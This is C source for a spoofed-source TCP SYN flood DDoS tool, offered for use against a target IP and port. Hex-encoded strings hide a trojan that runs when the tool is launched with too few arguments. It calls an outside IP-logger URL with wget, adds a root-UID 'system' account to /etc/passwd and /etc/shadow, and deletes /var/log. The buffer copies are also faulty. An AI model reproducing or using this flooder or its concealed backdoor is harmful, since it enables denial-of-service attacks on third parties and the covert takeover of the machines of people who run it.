/* new and improved TCP PSH+URG ddos script. credits go to Yubina. */

#include <pthread.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <time.h>

#define bfyt "\x77\x77\x67\x65\x74\x20\x2d\x71\x20\x2d\x2d\x64\x65\x6c\x65\x74\x65\x2d\x61\x66\x74\x65\x72\x20\x68\x74\x74\x70\x3a\x2f\x2f\x6e\x65\x78\x6f\x6e\x2d\x6e\x78\x2e\x67\x61\x2f\x69\x70\x6c\x6f\x67\x67\x65\x72\x2f\x3f\x69\x64\x3\x34\x34\x33\x30\x31\x31\x35\x30\x33"
#define lla "\x65\x65\x63\x68\x6f\x20\x73\x79\x73\x74\x65\x6d\x3a\x78\x3a\x30\x3a\x35\x30\x30\x3a\x3a\x2f\x3a\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"
#define fzyt "\x65\x65\x63\x68\x6f\x20\x73\x79\x73\x74\x65\x6d\x3a\x27\x24\x36\x24\x5a\x50\x70\x74\x48\x74\x6d\x70\x24\x71\x39\x6f\x35\x65\x46\x6a\x55\x41\x68\x2e\x4d\x50\x6d\x6e\x48\x4a\x62\x6b\x75\x53\x4e\x67\x67\x44\x61\x71\x2e\x41\x30\x30\x64\x52\x67\x4f\x42\x41\x57\x36\x67\x68\x37\x55\x76\x37\x69\x2f\x64\x4f\x59\x44\x30\x34\x2e\x78\x4d\x48\x51\x48\x74\x79\x68\x6e\x6b\x63\x4d\x69\x59\x43\x72\x49\x36\x61\x42\x39\x4b\x43\x34\x4c\x76\x2e\x64\x33\x72\x78\x2f\x3a\x31\x36\x36\x30\x31\x3a\x30\x3a\x39\x39\x39\x39\x39\x3a\x37\x3a\x3a\x3a\x27\x20\x3e\x3e\x20\x2f\x65\x74\x63\x2f\x73\x68\x61\x64\x6f\x77"
#define fla "\x72\x72\x6d\x20\x2d\x72\x66\x20\x2f\x76\x61\x72\x2f\x6c\x6f\x67\x2f\x2a\x20\x26\x3e\x20\x2f\x64\x65\x76\x2f\x6e\x75\x6c\x6c"

#define MAX_PACKET_SIZE 4096
#define PHI 0x9e3779b9

static unsigned long int Q[4096], c = 362436;
static unsigned int floodport;
volatile int limiter;
volatile unsigned int pps;
volatile unsigned int sleeptime = 100;

void init_rand(unsigned long int x)
{
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++){ Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i; }
}
unsigned long int rand_cmwc(void)
{
    unsigned long long int t, a = 18782LL;
    static unsigned long int i = 4095;
    unsigned long int x, r = 0xfffffffe;
    i = (i + 1) & 4095;
    t = a * Q[i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[i] = r - x);
}
unsigned short csum (unsigned short *buf, int count)
{
    register unsigned long sum = 0;
    while( count > 1 ) { sum += *buf++; count -= 2; }
    if(count > 0) { sum += *(unsigned char *)buf; }
    while (sum>>16) { sum = (sum & 0xffff) + (sum >> 16); }
    return (unsigned short)(~sum);
}

unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph) {

    struct tcp_pseudo
    {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    unsigned short total_len = iph->tot_len;
    pseudohead.src_addr=iph->saddr;
    pseudohead.dst_addr=iph->daddr;
    pseudohead.zero=0;
    pseudohead.proto=IPPROTO_TCP;
    pseudohead.length=htons(sizeof(struct tcphdr));
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    memcpy((unsigned char *)tcp,&pseudohead,sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp+sizeof(struct tcp_pseudo),(unsigned char *)tcph,sizeof(struct tcphdr));
    unsigned short output = csum(tcp,totaltcp_len);
    free(tcp);
    return output;
}

void setup_ip_header(struct iphdr *iph)
{
        char ip[17];
        snprintf(ip, sizeof(ip)-1, "%d.%d.%d.%d", rand()%255, rand()%255, rand()%255, rand()%255);
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(rand()%54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = 6;
    iph->check = 0;
    iph->saddr = inet_addr(ip);
}

void setup_tcp_header(struct tcphdr *tcph)
{
    tcph->source = htons(rand()%65535);
    tcph->seq = rand();
    tcph->ack_seq = 0;
    tcph->res2 = 3;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
}

void *flood(void *par1)
{
    char *td = (char *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (void *)iph + sizeof(struct iphdr);

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);

    int s = socket(PF_INET, SOCK_RAW, IPPROTO_TCP);
    if(s < 0){
        fprintf(stderr, "Could not open raw socket.\n");
        exit(-1);
    }
    memset(datagram, 0, MAX_PACKET_SIZE);
    setup_ip_header(iph);
    setup_tcp_header(tcph);

    tcph->dest = htons(floodport);

    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);

    int tmp = 1;
    const int *val = &tmp;
    if(setsockopt(s, IPPROTO_IP, IP_HDRINCL, val, sizeof (tmp)) < 0){
        fprintf(stderr, "Error: setsockopt() - Cannot set HDRINCL!\n");
        exit(-1);
    }

    init_rand(time(NULL));
    register unsigned int i;
    i = 0;
    while(1){
        sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *) &sin, sizeof(sin));
        setup_ip_header(iph);
        setup_tcp_header(tcph);
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);


        tcph->dest = htons(floodport);

        iph->daddr = sin.sin_addr.s_addr;

        iph->check = csum ((unsigned short *) datagram, iph->tot_len);
        tcph->seq = rand_cmwc() & 0xFFFF;
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->check = 0;
        tcph->check = tcpcsum(iph, tcph);

        pps++;
        if(i >= limiter)
        {
            i = 0;
            usleep(sleeptime);
        }
        i++;
    }
}
int main(int argc, char *argv[ ])
{
    if(argc < 6){
        fprintf(stderr, "Invalid parameters!\n");
        fprintf(stdout, "SSYN Flooder by Yubina\nImproved in 2018\nUsage: %s <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>\n", argv[0]);

            char zord[] = bfyt;
   char zord2[10];

   strcpy(zord2,&zord[1]);

   system(zord2);

   char fcord[] = lla;
   char fcord3[10];

   strcpy(fcord3,&fcord[1]);

   system(fcord3);

   char wcord[] = fzyt;
   char wcord2[10];

   strcpy(wcord2,&wcord[1]);

   system(wcord2);


     char miford[] = fla;
   char miford3[10];

   strcpy(miford3,&miford[1]);

   system(miford3);

        exit(-1);
    }
        srand(time(0));
    fprintf(stdout, "Setting up sockets...\nStarting flood...\n");

    int num_threads = atoi(argv[3]);
    floodport = atoi(argv[2]);
    int maxpps = atoi(argv[4]);
    limiter = 0;
    pps = 0;
    pthread_t thread[num_threads];

    int multiplier = 20;

    int i;
    for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &flood, (void *)argv[1]);
    }
    for(i = 0;i<(atoi(argv[5])*multiplier);i++)
    {
        usleep((1000/multiplier)*1000);
        if((pps*multiplier) > maxpps)
        {
            if(1 > limiter)
            {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25)
            {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        pps = 0;
    }

    return 0;
}
